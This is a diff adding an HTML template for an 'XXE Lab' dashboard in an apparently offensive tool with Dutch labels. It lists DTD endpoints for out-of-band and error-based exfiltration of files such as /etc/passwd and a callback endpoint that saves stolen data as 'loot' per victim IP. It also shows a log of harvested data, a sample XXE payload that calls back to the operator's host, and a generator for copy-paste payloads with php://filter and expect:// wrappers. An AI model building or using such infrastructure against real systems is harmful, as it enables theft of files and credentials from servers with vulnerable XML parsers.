@@ -1,0 +1,172 @@
+{% extends "bootstrap/base.html" %}
+{% block title %}Incompetent Bastard - XXE Lab{% endblock %}
+
+{% block styles %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/dashboard-modern.css') }}" />
+<link rel="stylesheet" href="{{ url_for('static', filename='css/lab-generator.css') }}" />
+{% endblock %}
+
+{% block content %}
+<div class="page-title">
+  <div>
+    <h1>XXE Lab</h1>
+    <div class="breadcrumbs"><a href="/">Home</a> / <a href="/">Dashboard</a> / XXE</div>
+  </div>
+</div>
+
+<div class="grid cols-3">
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val accent-orange">{{ records|length }}</div>
+          <div class="sub">Total Requests</div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val">{{ records|selectattr('methode', 'equalto', 'callback')|list|length }}</div>
+          <div class="sub">Callbacks</div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val">{{ records|map(attribute='ip')|unique|list|length }}</div>
+          <div class="sub">Unique IPs</div>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<section class="card mt-14">
+  <div class="card-head">
+    <h2>Endpoints</h2>
+  </div>
+  <div class="card-body">
+    <table class="table compact">
+      <thead>
+        <tr><th>Route</th><th>Type</th><th>Beschrijving</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>/xxe/yolo.dtd?request=/etc/passwd&amp;callback={{ host }}</code></td>
+          <td>OOB</td>
+          <td>Out-of-band exfiltratie via callback naar <code>/xxe/froufrou</code></td>
+        </tr>
+        <tr>
+          <td><code>/xxe/fout.dtd?resource=/etc/passwd</code></td>
+          <td>Error</td>
+          <td>Error-based exfiltratie via XML parse error</td>
+        </tr>
+        <tr>
+          <td><code>/xxe/froufrou?request=1&amp;hatseflats=DATA</code></td>
+          <td>Callback</td>
+          <td>Ontvangt geexfiltreerde data, slaat op in <code>raw/loot/{ip}/xxe/</code></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section class="card mt-14">
+  <div class="card-head">
+    <h2>Exfiltratie Log</h2>
+  </div>
+  <div class="card-body">
+    {% if records %}
+    <table class="table compact">
+      <thead>
+        <tr>
+          <th>ID</th>
+          <th>IP</th>
+          <th>Bestand</th>
+          <th>Methode</th>
+          <th>Data</th>
+          <th>Datum</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for r in records %}
+        <tr>
+          <td>{{ r.id }}</td>
+          <td>{{ r.ip }}</td>
+          <td class="max-w-200 truncate"><code>{{ r.bestand }}</code></td>
+          <td>{{ r.methode }}</td>
+          <td class="max-w-300 truncate">{{ r.data[:200] if r.data else '' }}</td>
+          <td>{{ r.datum }}</td>
+          <td><button class="btn-sm btn-danger xxe-delete" data-id="{{ r.id }}">&#x2715;</button></td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+    {% else %}
+    <p class="help">Geen XXE data. Gebruik de DTD endpoints hierboven om XML External Entity exfiltratie te starten.</p>
+    {% endif %}
+  </div>
+</section>
+
+<section class="card mt-14">
+  <div class="card-head">
+    <h2>Voorbeeld Payload</h2>
+  </div>
+  <div class="card-body">
+    <pre class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "{{ host }}/xxe/yolo.dtd?request=/etc/passwd&amp;callback={{ host }}"&gt;
+  %xxe;
+]&gt;
+&lt;foo&gt;bar&lt;/foo&gt;</pre>
+  </div>
+</section>
+<section class="card mt-14">
+  <div class="card-head">
+    <h2>XXE Payload Generator</h2>
+  </div>
+  <div class="card-body" id="xxe-generator">
+    <div class="gen-section">
+      <p class="gen-note">Genereer XXE payloads voor copy-paste. Vul de parameters in en klik op Genereer.</p>
+      <div class="gen-grid">
+        <div><label>Bestand / resource</label><input type="text" id="xxe-file" placeholder="/etc/passwd"></div>
+        <div><label>Callback URL (jouw host)</label><input type="text" id="xxe-callback" value="{{ host }}"></div>
+        <div><label>Entity naam</label><input type="text" id="xxe-entity" placeholder="xxe" value="xxe"></div>
+        <div><label>Wrapper / filter</label>
+          <select id="xxe-wrapper">
+            <option value="none">Geen</option>
+            <option value="php_base64">php://filter base64</option>
+            <option value="php_utf7">php://filter UTF-7</option>
+            <option value="expect">expect://</option>
+          </select>
+        </div>
+      </div>
+      <div class="gen-actions">
+        <button class="btn-sm" id="xxe-gen-btn">Genereer XXE Payloads</button>
+      </div>
+    </div>
+    <div id="xxe-gen-output"></div>
+  </div>
+</section>
+{% endblock %}
+
+{% block scripts %}
+<script nonce="{{ csp_nonce }}" src="{{ url_for('static', filename='js/xxe-generator.js') }}"></script>
+<script nonce="{{ csp_nonce }}">
+document.querySelectorAll('.xxe-delete').forEach(function(btn) {
+  btn.addEventListener('click', function() {
+    var id = this.dataset.id;
+    fetch('/api/xxe/' + id, {method: 'DELETE'}).then(function() {
+      btn.closest('tr').remove();
+    });
+  });
+});
+</script>
+{% endblock %}
